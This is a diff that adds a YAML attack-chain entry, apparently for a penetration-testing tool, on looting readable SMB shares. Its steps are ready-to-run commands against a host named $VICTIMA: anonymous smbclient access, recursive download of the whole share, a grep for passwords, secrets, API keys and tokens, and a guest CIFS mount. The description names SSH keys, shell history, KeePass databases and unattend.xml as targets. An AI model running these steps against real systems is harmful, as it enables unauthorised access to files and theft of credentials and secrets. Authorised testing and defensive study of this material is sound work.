@@ -1,0 +1,46 @@
+chain_id: smb_share_loot
+title: "SMB share — loot a readable share for credentials and secrets"
+severity: HIGH
+tags: [smb, shares, read, file-disclosure]
+
+trigger:
+  any_of:
+    - { kind: "smb-share-read" }
+    - { kind: "smb-share-write" }
+
+description: |
+  At least one SMB share is readable. Mirror it locally and then run
+  the standard text-triage pass — config files, .ssh keys, .bash_history,
+  *.kdbx, and unattend.xml frequently live on shares that ops left open.
+
+steps:
+  - id: 1
+    title: "Connect with smbclient (anonymous first)"
+    command: smbclient //$VICTIMA/SHARE -N
+
+  - id: 2
+    title: "Inside smbclient — recursive download"
+    command: |
+      recurse ON
+      prompt OFF
+      ls
+      mget *
+      exit
+    notes: |
+      `ls` already shows hidden files inside smbclient — do NOT type `ls -la`.
+      That returns NT_STATUS_NO_SUCH_FILE.
+
+  - id: 3
+    title: "Triage with rootctl extract on the dumped tree"
+    command: |
+      grep -RIE 'password|secret|api[_-]?key|token' . 2>/dev/null
+      rootctl extract <each-interesting-file>
+
+  - id: 4
+    title: "Mount instead of mirror, if the share is huge"
+    command: |
+      sudo mkdir -p /mnt/share
+      sudo mount -t cifs //$VICTIMA/SHARE /mnt/share -o guest,vers=3.0
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
